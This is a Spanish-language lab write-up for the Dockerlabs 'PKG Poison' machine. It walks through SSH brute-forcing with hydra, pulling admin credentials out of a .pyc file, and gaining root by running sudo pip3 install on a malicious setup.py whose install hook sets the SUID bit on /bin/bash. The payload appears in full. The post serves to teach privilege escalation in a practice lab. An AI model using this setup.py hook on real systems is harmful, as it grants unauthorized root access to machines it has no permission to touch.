---
layout: post
title: "PKG Poison - Dockerlabs - Linux - Fácil"
date: 2026-02-22
img: /assets/img/pkgpoison/1.png
---

Para iniciar la fase de reconocimiento utilizaré un script que escribí en bash que realiza un escaneo de puertos, servicios, directorios web y algunas vulnerabilidades conocidas de manera automatica. Este script lo utilizo en laboratorios con el fin de ganar algo de tiempo de este proceso.
pueden encontrarlo en mi perfil de GitHub.

![img1](/secnotes/assets/img/pkgpoison/escaneo.png)

![img2](/secnotes/assets/img/pkgpoison/dir.png)

Al entrar al servicio web nos encontramos con una imagen, que al inspeccionar no encontramos información útil

![img3](/secnotes/assets/img/pkgpoison/web1.png)

![img4](/secnotes/assets/img/pkgpoison/web2.png)

El escaneo de directorios web nos muestra una ruta hacia /notes, y que al acceder a ella podemos ver un archivo .txt 

![img5](/secnotes/assets/img/pkgpoison/notes1.png)

Este archivo nos muestra un mensaje diciendo que el usuario "dev" debe cambiar sus credenciales. Adicionalmente podriamos considerar un usuario llamado admin...

![img6](/secnotes/assets/img/pkgpoison/notes2.png)

Teniendo estas credenciales intentamos ingresar por el servicio ssh, pero no tenemos éxito. Si tenemos un nombre de usuario, así que utilizamos la herramienta **hydra** para intentar descifrar la contraseña del usuario **"dev"**

![img7](/secnotes/assets/img/pkgpoison/hydra.png)

Luego de este ataque obtenemos sus credenciales. 

![img8](/secnotes/assets/img/pkgpoison/ssh.png)

Una vez dentro del sistema con este usuario, procedemos con la búsqueda de permisos o aplicaciones mal configuradas con el fin de encontrar algún vector de ataque de escalada de privilegios. Sin embargo no encontramos nada.. 

Al no encontrar nada útil, buscamos en los directorios a los que tenemos acceso con este usuario, y finalmente, en la ruta de /opt, encontramos algo de interés...
en el directorio "__pycache__" es donde Python guarda automaticamente los archivos compilados (secret.cpython-38-pyc). Cuando ejecutamos un programa en python, el intérprete no lee el código fuente (.py) directamente cada vez. Para ir mas rápido, este lo compila a un lenguaje intermedio llamado Bytecode.

Un archivo .py es el código que nosotros escribimos (legible para humanos) 

Un archivo .pyc es el código compilado (legible para máquinas)

Al leer el archivos encontramos algo de texto que no es muy legible, es por esto que utilizamos `strings` para que nos extraiga texto legible, es por esto que nos mostró las credenciales.

![img9](/secnotes/assets/img/pkgpoison/admin.png)

una vez dentro con el nuevo usuario admin, veremos si tenemos un mayor alcance 

![img10](/secnotes/assets/img/pkgpoison/admin1.png)

Aquí nos encontramos con permisos para ejecutar pip3 install

En linux, el archivo  /etc/sudoers define que puede hacer cada usuario, El usuario actual (admin) tiene permisos para ejecutar pip3 como root sin necesidad de una contraseña, la vulnerabilidad está en que pip3 no solo descarga archivos, tambien ejecuta códigos para instalar paquetes.

Entonces.. cuando pip3 instala un paquete, busca un archivo llamado setup.py. Este archivo es un script de Python que se ejecuta automáticamente durante el proceso de instalación para configurar el paquete.

Al ejecutar pip3 install con sudo, el script setup.py se ejecuta con privilegios de root.

Como pip3 install permite instalar paquetes desde directorios locales que contengan un archivo setup.py, así que vamos a crear uno en el directorio /tmp que cambie los permisos de /bin/bash a SUID al momento de intentar "instalarse".

******Gereramos este código con ayuda de la IA*******

`cat << EOF > setup.py
from setuptools import setup
from setuptools.command.install import install
import os

class PreInstall(install):
    def run(self):
        # Aquí inyectamos el comando que nos hará root
        os.system("chmod u+s /bin/bash")
        install.run(self)

setup(name="poison", version="1.0", cmdclass={'install': PreInstall})
EOF`


vamos a explicar este script

<< EOF: le indica a la Shell que todo lo que se escriba a continuación es parte del archivo, hasta que se escriba la palabra EOF (End Of File) solo en una linea.
setup.py: Redirige todo ese bloque de texto para crear el archivo llamado setup.py
from setuptools import setup: La función estándar para definir paquetes en Python.
from setuptools.command.install import install: Importamos la clase que gestiona el proceso de instalación.

Aquí viene la clase maliciosa...

Creamos una clase (class PreInstall (install)) que hereda de la clase original de instalación.
def run (self): Le decimos a Python: Antes de hacer la instalación normal, ejecuta lo que yo te diga.
os.system("chmod u+s /bin/bash"): Esta es el payload. Ejecuta un comando a nivel del sistema que asigna el bit SUID a bash

Activación

setup(name="poison", ..., cmdclass={'install': PreInstall}) 
cmdclass: aqui le decimos a setup que, en lugar de usar la función de instalacion normal, use nuestra clase PreInstall

La ejecución

sudo /usr/bin/pip3 install .

pip3 busca un paquete en el directorio actual (.)
encuentra setup.py
Como es una instalación, ejecuta el método run() de la clase que creamos
Como pip3 se lanzó con sudo, el comando chmod u+s /bin/bash se ejecuta con permisos de root.

Resultado

`bash -p` 

Si ejecutamos bash que tienen el bit SUID, el mismo detrecta que el usuario real (admin) no es el dueño (root) y suelta los privilegios por seguridad.
pero al usar -p (persist) forzamos a la shell a mantener el privilegio  del dueño del archivo. Como el dueño es root, obtenemos una shell con sus permisos

EN resumen, utilizamos un archivo lamado setup.py malisioso para abusar de la funcionalidad de instalacion de paquetes de Python, que al ejecutar pip3 con privilegios de sudo, el script de configuración agrego el bit de SUID a bash, permitiendo una escalada de privilegios persistente mediante el comando bash -p

![img11](/secnotes/assets/img/pkgpoison/root.png)




